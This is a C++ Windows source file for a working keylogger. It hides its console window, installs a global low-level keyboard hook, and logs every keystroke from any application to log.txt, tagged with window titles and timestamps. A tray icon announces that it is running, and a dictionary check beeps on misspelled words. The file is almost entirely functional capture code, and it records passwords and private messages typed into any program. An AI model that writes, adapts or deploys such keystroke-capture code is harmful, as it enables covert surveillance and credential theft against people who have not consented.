#include <windows.h>
#include <iostream>
#include <fstream>
#include <ctime>

#include "dictionary.h"

/*
 * A hook is a point in the system message-handling mechanism
 * where an application can install a subroutine to monitor
 * the message traffic in the system and process certain types of messages
 * before they reach the target window procedure.
 */
HHOOK hook; // handler to the hook

// contains information about a low-level keyboard input event.
KBDLLHOOKSTRUCT KBStruct;

// contains information that the system needs to display notifications in the notification area
NOTIFYICONDATA nid = {0};

std::ofstream file; // for output
char PrevProgName[256]; // name of program

dictionary dict;
std::string buffer;

void CheckWord(std::string& buf) {
    if (!buf.empty() && !dict.check(buf)) {
        MessageBeep(MB_ICONEXCLAMATION);
    }
    buf.clear();
}

void WriteToLog(int key) {
    // mouse click -> skipping it
    if (key == 1 || key == 2) {
        return;
    }

    // HWND - handler to the window
    HWND foreground = GetForegroundWindow();

    // DWORD == unsigned int
    DWORD ThreadID;

    // HKL - handler to the keyboard layout
    HKL KeyboardLayout;

    ThreadID = GetWindowThreadProcessId(foreground, NULL);
    KeyboardLayout = GetKeyboardLayout(ThreadID);

    if (foreground) {
        // there is a program in foreground

        char CurProgName[256];
        GetWindowTextA(foreground, CurProgName, 256);

        if (strcmp(CurProgName, PrevProgName) != 0) {
            strcpy(PrevProgName, CurProgName);

            time_t CurTime = time(NULL);
            struct tm *tm = localtime(&CurTime);
            char time[64];
            strftime(time, sizeof(time), "%c", tm);

            file << std::endl << "[" << CurProgName << " | " << time << "]" << std::endl;
        }

    }

    switch (key) {
        case VK_BACK:
            file << "[BACKSPACE]";
            if (dict.is_active() && !buffer.empty()) {
                buffer.pop_back();
            }
            break;
        case VK_RETURN:
            file << "\n";
            if (dict.is_active()) {
                CheckWord(buffer);
            }
            break;
        case VK_SPACE:
            file << " ";
            if (dict.is_active()) {
                CheckWord(buffer);
            }
            break;
        case VK_TAB:
            file << "[TAB]";
            if (dict.is_active()) {
                CheckWord(buffer);
            }
            break;
        case VK_SHIFT:
        case VK_LSHIFT:
        case VK_RSHIFT:
        case VK_CONTROL:
        case VK_LCONTROL:
        case VK_RCONTROL:
        case VK_MENU:
        case VK_LMENU:
        case VK_RMENU:
        case VK_CAPITAL:
            break;
        case VK_ESCAPE:
            file << "[ESC]";
            break;
        case VK_END:
            file << "[END]";
            break;
        case VK_HOME:
            file << "[HOME]";
            break;
        case VK_UP:
            file << "[UP]";
            break;
        case VK_DOWN:
            file << "[DOWN]";
            break;
        case VK_LEFT:
            file << "[LEFT]";
            break;
        case VK_RIGHT:
            file << "[RIGHT]";
            break;
        default: {
            bool lower;
            if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0) {
                // If the low-order bit is 1, the key is toggled.
                lower = false;
            } else {
                lower = true;
            }

            if ((GetKeyState(VK_SHIFT) & 0x1000) != 0) {
                // If the high-order bit is 1, the key is down
                lower = !lower;
            }

            BYTE KeyboardState[256];
            GetKeyboardState(KeyboardState);

            wchar_t UnicodeKey;
            char CurKey;
            ToUnicodeEx(key, MapVirtualKey(key, MAPVK_VK_TO_VSC), KeyboardState, &UnicodeKey, 1, 0, KeyboardLayout);

            // maps a UTF-16 string to a new character string.
            WideCharToMultiByte(CP_ACP, 0, &UnicodeKey, -1, &CurKey, 1, NULL, NULL);


            // key will be in lower case by default
            /*if (!lower) {
                CurKey = toupper(CurKey);
            }*/
            if (CurKey == ',' || CurKey == '.' || CurKey == '!' || CurKey == '?' ||
                    CurKey == ':' || CurKey == ';' || CurKey == ')' || CurKey == '(') {
                if (dict.is_active()) {
                    CheckWord(buffer);
                }
                file << CurKey;
            }
            else if (std::iswprint(UnicodeKey)) {
                file << CurKey;
                if (std::iswalpha(UnicodeKey) && dict.is_active()) {
                    buffer.push_back(CurKey);
                }
            }
        }
    }
    file.flush();
}

// activates if the key is pressed
LRESULT CALLBACK HookCallBack(int code, WPARAM message, LPARAM event) {
    if (code >= 0) {
        if (message == WM_KEYDOWN || message == WM_SYSKEYDOWN) {
            // getting info about pressed key
            KBStruct = *((KBDLLHOOKSTRUCT*)event);
            WriteToLog(KBStruct.vkCode);
        }
    }

    // passes the hook information to the next hook procedure in the current hook chain.
    return CallNextHookEx(hook, code, message, event);
}

// processes messages sent to a window
LRESULT CALLBACK WindowProc(HWND window, UINT message, WPARAM wParam, LPARAM lParam) {
    switch (message) {
        // message from icon
        case WM_USER:
            if (lParam == WM_RBUTTONDOWN)
                if (MessageBox(NULL, TEXT("Close keylogger?"), TEXT("Keylogger"), MB_YESNO) == IDYES) {
                    DestroyWindow(window);
                    Shell_NotifyIconA(NIM_DELETE, &nid);
                }
            break;
        case WM_DESTROY:
            // indicates to the system that a thread has made a request to terminate
            PostQuitMessage(0);
            break;
        default:
            // calls the default window procedure to provide default processing for
            // any window messages that an application does not process
            return DefWindowProc(window, message, wParam, lParam);
    }
}

int WINAPI WinMain(HINSTANCE instance, HINSTANCE, LPTSTR, int) {
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), SW_HIDE);
    setlocale(LC_ALL, "russian");

    // registering new window class (it is needed for tray icon)
    WNDCLASSEX main = { 0 }; // contains window class information
    main.cbSize = sizeof(WNDCLASSEX); // size of structure
    main.hInstance = instance; // handle to the instance that contains window procedure
    main.lpszClassName = TEXT("Main"); // class name
    main.lpfnWndProc = WindowProc; // window procedure function
    RegisterClassEx(&main);

    // creating main window
    HWND window = CreateWindowEx(0, "Main", NULL, 0, 0, 0, 0, 0, NULL, NULL, instance, NULL);


    nid.cbSize = sizeof(NOTIFYICONDATA); // size of structure
    nid.hWnd = window; // handle to the window that receives notifications associated with an icon
    nid.uFlags = NIF_MESSAGE | NIF_ICON | NIF_TIP; // shows that uCallbackMessage, hIcon and szTip are valid
    nid.uCallbackMessage = WM_USER;
    nid.hIcon = LoadIcon(NULL, IDI_WARNING); // handle to icon
    sprintf(nid.szTip, "Keylogger is active. Right click to close");

    Shell_NotifyIconA(NIM_ADD, &nid);

    file.open("log.txt", std::ios::app); // we'll write to the end of file

    // installing hook that monitors low-level keyboard events
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallBack, NULL, 0);

    // MSG contains message information from a thread's MQ.
    MSG message;

    // retrieves messages for any window that belongs to the current thread
    while (GetMessage(&message, NULL, 0, 0)) {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }
}